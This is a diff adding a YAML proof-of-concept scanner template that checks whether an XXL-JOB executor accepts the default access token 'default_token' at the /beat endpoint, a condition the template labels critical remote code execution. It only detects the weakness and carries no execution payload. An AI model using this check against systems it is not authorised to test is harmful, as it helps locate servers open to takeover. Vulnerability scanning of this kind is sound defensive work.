@@ -1,0 +1,30 @@
+id: poc-yaml-xxl-job-defaule-accesstoken-rce
+info:
+  name: XXL-JOB 默认 accessToken 身份绕过导致rce
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: xxl-job
+requests:
+- method: GET
+  path: /beat
+  expression: 'status_code == 200
+
+    && contains(body, "\"code\":500,\"msg")
+
+    && contains(body, "invalid request, HttpMethod not support.")
+
+    '
+- method: POST
+  path: /beat
+  headers:
+    XXL-JOB-ACCESS-TOKEN: default_token
+  data: null
+  expression: 'status_code == 200
+
+    && contains(body, "{\"code\":200")
+
+    '
+variables: {}
+transport: http
